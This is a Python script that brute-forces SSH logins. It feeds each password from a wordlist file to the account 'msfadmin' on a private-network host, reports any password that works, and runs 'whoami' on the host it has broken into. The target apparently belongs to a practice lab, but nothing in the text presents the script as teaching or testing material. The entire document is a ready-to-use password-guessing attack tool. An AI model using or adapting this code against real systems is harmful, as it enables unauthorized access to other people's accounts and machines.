#!/usr/bin/python3
""" Imports """
import pexpect
from termcolor import colored

PROMPT = ['#', '>>>', '> ', '\$']

def send_cmd(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)


def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    conn_str = 'ssh {}@{}'.format(user, host)
    child = pexpect.spawn(conn_str)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey,'[P|p]assword:' ])
    if ret == 0:
        print(colored('[-] Error connecting', 'red'))
    if ret ==1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print(colored('[-] Error connecting', 'red'))
            return
    child.sendline(password)
    child.expect(PROMPT, timeout=0.5)
    return child
        
def main():
    host = '192.168.1.79'
    user = 'msfadmin'
    file = open('passwords.txt', 'r') 
    for password in file.readlines():
        password = password.strip('\n')
        try:
            child = connect(user, host, password)
            print(colored('[+] password Found: {}'.format(password), 'yellow'))
            send_cmd(child, 'whoami')
        except Exception:
            print(colored('[-] Wrong Password {}'.format(password), 'red'))


if __name__ == '__main__':
    main()
